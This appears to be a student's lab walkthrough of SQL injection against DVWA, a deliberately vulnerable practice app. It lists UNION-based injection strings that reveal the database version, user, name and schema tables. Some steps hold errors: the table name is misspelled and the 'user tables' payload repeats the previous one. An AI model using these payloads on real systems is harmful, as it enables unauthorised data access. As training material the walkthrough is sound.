INJECTION

1. Type in " 1 " in User ID

DVWA will show ID, first name and surname on screen.

SCENARIOS

1. Type in " %' or '0'='0 " in User ID

By typing in above, DVWA will show all the true scenarios and false scenarios.

DATADBASE VERSION

1. Type in " %' or 0=0 union select null, version () # " in User ID

It will show first name, surname and in the last roll it will show database followed behind surname.

DATABASE USER

1. Type in " %' or 0=0 union select null, user () # " in User ID

In the last roll it is supposed to show  database user that executed the command.

DATABASE NAME

1. Type in " %' or 0=0 union select null, database () # " in User ID

In the last roll it is supposed to show  surname.

ALL TABLES IN INFORMATION_SCHEMA

1. Type in " %' or 1=0 union select null, table_name from informaiton_schema. tables # " in User ID

It is supposed to show all the tables in the information_schema behind surname. It is about all the other databases that MySQL server maintains.

USER TABLES IN INFORMATION_SCHEMA

1. Type in " %' or 1=0 union select null, table_name from informaiton_schema. tables # " in User ID

DVWA will display all the tables that start with the prefix "user" in the information_schema database.

Due to the lack of filtering, attackers are able to access lots of infos by type in Mysql functions.